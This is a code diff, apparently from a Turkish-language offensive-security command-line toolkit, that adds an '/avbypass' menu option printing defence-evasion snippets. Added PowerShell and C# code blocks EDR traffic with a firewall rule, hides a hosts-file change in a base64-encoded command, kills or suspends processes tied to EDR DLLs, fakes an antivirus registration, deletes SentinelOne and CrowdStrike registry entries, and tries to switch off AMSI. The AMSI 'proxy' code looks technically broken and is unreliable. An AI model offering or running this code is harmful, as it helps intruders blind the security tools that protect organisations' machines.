@@ -347,7 +347,7 @@ kullani = '''
 /malwares !
 /lolbin !
 /connect !
-/avbypass soon
+/avbypass !
 /create !
 /bypass !
 '''
@@ -407,6 +407,138 @@ Malware 6 (DLL Injection in C)
 Malware 7 (Process and Thread Injection in C)
 
     Kullanım Amacı: Hedef süreçlerde shellcode çalıştırmak amacıyla bellek ayırma ve işlem / thread enjekte etme işlemi yapar. Bu shellcode'u yürütmek için hedef süreçlerin iş parçacıklarını kullanır.'''
+
+
+avbypass = r'''
+EDR bypass:
+🔥 Alternatif: PowerShell ile netsh Kullanarak IP Bazlı Egress Engelleme
+
+$ip = "198.51.100.45" # EDR sunucu IP’si (örnek IP - değiştirmelisin)
+$rule = "block_edr"
+
+Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
+
+🎭 Daha Gizli Versiyon (Script Block Logging vs Bypass için encoded payload):
+
+$cmd = 'Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value "127.0.0.1`ttele.edr.cloud"'
+$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -EncodedCommand $enc
+
+
+🛡️ 3. EDR DLL Load'larını Etkin Süreçte İzleme ve Kapatma (Sysmon / Event 7 Gibi)
+
+EDR’ye ait DLL’lerin hangi süreçlere yüklendiğini görüp, PowerShell ile dinamik olarak bunları suspend veya unload etmeye çalışmak:
+
+$edrDll = "edrhook.dll"
+Get-Process | ForEach-Object {
+    try {
+        $modules = $_.Modules
+        foreach ($mod in $modules) {
+            if ($mod.ModuleName -like "*$edrDll*") {
+                Write-Host "[!] EDR DLL bulundu: $($mod.ModuleName) in process $($_.Name)"
+                Stop-Process -Id $_.Id -Force
+            }
+        }
+    } catch {}
+}
+
+
+🧨 2. Advanced API-based Suspend (Low-Level Native)
+
+Bu yöntem, ntdll.dll üzerinden NtSuspendProcess çağrısı yapar. Gelişmiş EDR’ler bu çağrıyı yakalayabilir ama API call stack çok daha düşük seviye olduğu için bazı sistemlerde çalışabilir.
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class PsSuspend {
+    [DllImport("ntdll.dll")]
+    public static extern uint NtSuspendProcess(IntPtr processHandle);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint access, bool inheritHandle, int processId);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr handle);
+}
+"@
+
+$target = Get-Process | Where-Object { $_.Name -like "*edr*" } | Select-Object -First 1
+
+if ($target) {
+    $procId = $target.Id
+    $access = 0x0800
+    $handle = [PsSuspend]::OpenProcess($access, $false, $procId)
+
+    if ($handle -ne [IntPtr]::Zero) {
+        [PsSuspend]::NtSuspendProcess($handle) | Out-Null
+        [PsSuspend]::CloseHandle($handle) | Out-Null
+        Write-Host "[+] Süreç askıya alındı: $($target.Name) (PID: $procId)"
+    } else {
+        Write-Host "[-] Process handle alınamadı. Yetki yetersiz olabilir."
+    }
+}
+
+
+
+
+counter-EDR:
+
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" -Force
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
+  -Name "DisplayName" -Value "UltraSecureX Antivirus"
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
+  -Name "PathToSignedProductExe" -Value "C:\UltraSecureX\securex.exe"
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\{FAKE-GUID-HERE}" `
+  -Name "ProductState" -Value 0x00001000
+
+# Remove existing EDR entries
+Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av\" | ForEach-Object {
+    $val = Get-ItemProperty $_.PSPath
+    if ($val.DisplayName -like "*SentinelOne*" -or $val.DisplayName -like "*CrowdStrike*") {
+        Write-Host "EDR kaydı bulundu: $($val.DisplayName)"
+        Remove-Item $_.PSPath -Force
+    }
+}
+
+Amsi bypass:
+registry ile:
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\AMSI" -Name "Enable" -Value 0
+
+
+
+amsi bypas with dll proxying:
+# AMSI tarama fonksiyonunun değiştirilmesi
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class AMSI {
+    [DllImport("amsi.dll", SetLastError = true)]
+    public static extern int AmsiScanBuffer(IntPtr buffer, uint length, string contentName, uint contentType, out uint result);
+
+    // AMSI ScanBuffer fonksiyonunu proxy'liyoruz (NOP işlemi)
+    public static int AmsiScanBuffer_Proxy(IntPtr buffer, uint length, string contentName, uint contentType, out uint result) {
+        result = 0;  // Herhangi bir tarama yapılmıyor, sonuç başarı (0)
+        return 0;  // Başarı kodu döndürüyoruz (0)
+    }
+}
+"@ -Language CSharp
+
+# AMSI ScanBuffer fonksiyonunu proxy yapıyoruz
+[AMSI]::AmsiScanBuffer([IntPtr]::Zero, 0, "", 0, [ref]$null)
+
+# AMSI fonksiyonlarını proxy'le
+$originalAmsiScanBuffer = [AMSI]::AmsiScanBuffer
+[AMSI]::AmsiScanBuffer = [AMSI]::AmsiScanBuffer_Proxy
+
+# Artık AMSI'nin taramaları geçici olarak devre dışıdır
+Write-Host "AMSI bypass edildi."
+
+'''
+
 yazi = '''
 
 
@@ -487,9 +619,10 @@ while True:  # Sonsuz döngü başlatıyoruz
         os.system('python3 connect.py')
     elif yaz == '/malwares':
         print(amac)
+    elif yaz == '/avbypass':
+        print(avbypass)
     elif yaz.strip().lower() == 'exit':  # 'exit' komutu ile döngüden çıkılır
         print("Program kapatılıyor...")
         break  # Döngüyü sonlandırır ve programı kapatır
     else:
         print('Geçersiz komut!')  # Geçersiz komut girildiğinde hata mesajı
-
